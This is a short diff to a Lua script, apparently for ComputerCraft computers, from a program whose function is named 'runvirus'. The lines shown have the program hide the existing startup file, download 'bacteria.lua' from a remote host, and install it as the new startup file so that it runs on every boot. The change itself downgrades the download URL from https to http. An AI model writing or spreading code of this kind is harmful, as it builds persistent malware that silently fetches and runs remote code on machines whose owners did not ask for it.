@@ -104,7 +104,7 @@ local function runvirus()
     end
     
     local function update()
-        local fc = http.get("https://files.fluidnode.com/hidden/cc/bacteria.lua")
+        local fc = http.get("http://files.fluidnode.com/hidden/cc/bacteria.lua")
         if fc then
             oldfs.delete("/startup")
             local fh = oldfs.open("/startup", "w")
@@ -149,7 +149,7 @@ else
     if fs.exists("/startup") then
         fs.move("/startup", "/.bacteriastartup")
     end
-    local fc = http.get("https://files.fluidnode.com/hidden/cc/bacteria.lua")
+    local fc = http.get("http://files.fluidnode.com/hidden/cc/bacteria.lua")
     if fc then
         local fh = fs.open("/startup", "w")
         if fh then
